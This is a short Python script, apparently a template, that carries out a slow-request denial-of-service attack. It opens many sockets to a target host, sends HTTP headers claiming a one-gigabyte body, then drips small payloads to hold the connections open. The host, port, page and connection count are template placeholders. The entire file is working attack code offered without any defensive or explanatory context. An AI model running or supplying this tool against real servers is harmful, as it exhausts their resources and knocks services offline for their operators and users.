import socket
import time
import threading

MAX_CONN = conn_conn_conn
PORT = port_port_port
HOST = "host_host_host"
PAGE = "page_page_page"

buf = ("GET %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
       "Content-Length: 1000000000\r\n"
       "\r\n" % (PAGE, HOST))

socks = []

def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(bytes(buf, encoding='utf-8'))
            socks.append(s)
        except Exception as ex:
            time.sleep(2)

def send_thread():
    global socks
    for i in range(10):
        for s in socks:
            try:
                s.send(bytes("pervise!", encoding='utf-8'))
            except Exception as ex:
                socks.remove(s)
                s.close()
        time.sleep(1)

conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()